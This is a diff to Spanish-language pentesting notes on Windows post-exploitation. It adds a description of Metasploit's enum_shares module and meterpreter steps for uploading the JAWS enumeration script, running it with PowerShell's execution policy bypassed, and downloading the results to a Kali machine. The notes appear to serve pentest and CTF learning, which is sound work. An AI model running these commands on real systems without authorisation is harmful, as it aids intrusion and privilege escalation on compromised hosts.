@@ -239,9 +239,35 @@ msf post(windows/gather/enum_patches) > set session <id>
 msf post(windows/gather/enum_patches) > run
 ```
 
+### `enum_shares`
+
+El módulo `post/windows/gather/enum_shares` de Metasploit se utiliza para enumerar los recursos compartidos (SMB shares) accesibles desde el sistema Windows comprometido.
+
+Su objetivo es identificar qué carpetas o recursos compartidos están disponibles en la red y a los que el usuario actual tiene acceso.
+
 ### JAWS (Just Another Windows (Enum) Script)
 
 Es un script de PowerShell diseñado para ayudar a los pentesters (y participantes de CTF) a identificar rápidamente posibles vectores de escalada de privilegios en sistemas Windows.
 
 Está desarrollado en PowerShell 2.0, por lo que debería ser compatible con todas las versiones de Windows desde Windows 7 en adelante.
 
+Subimos el script usando una sesión meterpreter:
+
+```bash
+meterpreter > cd C:\Temp # Si Temp no existe lo creamos con mkdir.
+meterpreter > upload /path/jaws-enum.ps1
+meterpreter > 
+```
+
+Lo ejecutamos de la siguiente forma:
+
+```bash
+meterpreter > shell
+C:\Temp > powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename jaws-enum.txt
+```
+
+Descargamos los resultados a nuestra máquina kali:
+
+```bash
+meterpreter > download jaws-enum.txt
+```
